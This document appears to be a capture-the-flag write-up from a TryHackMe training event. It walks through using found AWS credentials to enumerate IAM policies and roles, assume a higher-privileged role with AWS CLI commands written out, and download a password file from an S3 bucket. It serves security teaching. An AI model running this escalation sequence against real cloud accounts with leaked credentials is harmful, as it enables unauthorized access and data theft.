# Day 23: AWS Security - S3cret Santa

## 📝 Scenario
In Day 23, an infiltrated elf discovered a set of cloud credentials left on Sir Carrotbane's desktop. These credentials belonged to a user named `sir.carrotbane`, but their direct permissions seemed limited. The objective was to use these credentials to regain access to TBFC's cloud network.

As a security researcher, my goal was to perform **Cloud Enumeration** and **Privilege Escalation** within an AWS environment. I needed to identify the permissions assigned to the compromised user, discover a high-privileged role (`bucketmaster`), assume that role to gain temporary credentials, and finally exfiltrate sensitive data from an Amazon S3 bucket.

## 🛠️ Tools & Technologies Used
* **AWS CLI (Command Line Interface):** A unified tool to manage AWS services from the terminal, used here to enumerate IAM entities and interact with S3.
* **AWS IAM (Identity and Access Management):** The service that controls access to AWS resources.
* **AWS STS (Security Token Service):** The service used to request temporary, limited-privilege credentials (used for assuming roles).
* **Amazon S3 (Simple Storage Service):** The object storage service where the target data was hidden.

## 🧠 Theoretical Concepts
* **IAM Policies:** JSON documents that define permissions. They determine what actions (e.g., `s3:GetObject`) are allowed or denied on specific resources.
* **IAM Roles vs. Users:**
    * **User:** A permanent identity with long-term credentials (password/keys).
    * **Role:** A temporary identity that has specific permissions. Users (or services) can "assume" a role to temporarily gain its powers.
* **AssumeRole:** An action that grants a set of temporary security credentials that you can use to access AWS resources that you might not normally have access to.

* **S3 Buckets:** Containers for objects (files) stored in S3. Permissions can be set at the bucket level or object level.

## 🕵️‍♂️ Investigation Walkthrough

### Step 1: User & Policy Enumeration
I began by configuring the discovered credentials and enumerating the current user context.
1.  **List Users:** I checked the user list to confirm the account details.
    ```bash
    aws iam list-users
    ```
2.  **Enumerate Permissions:** I listed the policies attached to `sir.carrotbane`.
    ```bash
    aws iam list-user-policies --user-name sir.carrotbane
    ```
3.  **Analyze Policy:** Upon inspecting the inline policy, I discovered that while the user couldn't do much directly, they possessed the `sts:AssumeRole` permission. This was the pivot point.

### Step 2: Role Discovery
Knowing I could assume a role, I needed to find a valid target role.
1.  **List Roles:**
    ```bash
    aws iam list-roles
    ```
    *Result:* I found a role named **bucketmaster**.
2.  **Inspect Role Permissions:** I examined the policy attached to this role to see if it was worth assuming.
    ```bash
    aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy
    ```
    *Result:* The policy allowed `s3:ListAllMyBuckets`, `s3:ListBucket`, and `s3:GetObject`. This confirmed the role had access to the target data.

### Step 3: Privilege Escalation (Assuming the Role)
I utilized the `sts:AssumeRole` command to generate temporary credentials for the `bucketmaster` role.
1.  **Command:**
    ```bash
    aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC
    ```
2.  **Exporting Credentials:** The command output provided an `AccessKeyId`, `SecretAccessKey`, and `SessionToken`. I exported these to my environment variables to effectively "become" the `bucketmaster`.
    ```bash
    export AWS_ACCESS_KEY_ID="ASIAR..."
    export AWS_SECRET_ACCESS_KEY="wJalr..."
    export AWS_SESSION_TOKEN="FQoG..."
    ```
3.  **Verification:** I ran `aws sts get-caller-identity` to confirm I was now operating as `assumed-role/bucketmaster`.

### Step 4: S3 Exfiltration
With the elevated privileges, I accessed the S3 storage.

1.  **List Buckets:**
    ```bash
    aws s3api list-buckets
    ```
    *Result:* Found a bucket named `easter-secrets-123145`.
2.  **List Objects:**
    ```bash
    aws s3api list-objects --bucket easter-secrets-123145
    ```
    *Result:* Found a file named `cloud_password.txt`.
3.  **Download File:**
    ```bash
    aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
    ```
4.  **Data Extraction:** Reading the file revealed the final flag/password.

## 🧠 Key Takeaways
* **Enumeration is Key:** In Cloud environments, initial access users often have limited permissions. Enumerating roles and policies is essential to finding paths for lateral movement or privilege escalation.
* **The Power of AssumeRole:** The ability to assume a role is a high-value target for attackers. It allows them to pivot from a low-privilege user to a high-privilege context (like an S3 admin).
* **Environment Variables:** When pivoting in AWS CLI, you must update your local environment variables (`AWS_ACCESS_KEY_ID`, etc.) with the *temporary* credentials provided by STS, otherwise, you are still acting as the original user.

## 📸 Screenshots
*Below are the findings from the AWS investigation.*

![User Policy Enumeration](screenshots/Day%2023/1.png)
*Figure 1: Policy name assigned to sir.carrotbane.*

![Role Policy Inspection](screenshots/Day%2023/2.png)
*Figure 2: Identifying that the 'bucketmaster' role has S3 access.*

![S3 File Download](screenshots/Day%2023/3.png)
*Figure 3: Exfiltrating the 'cloud_password.txt' file from the S3 bucket.*

## 🔗 References
* [TryHackMe - Advent of Cyber 2025](https://tryhackme.com/adventofcyber25)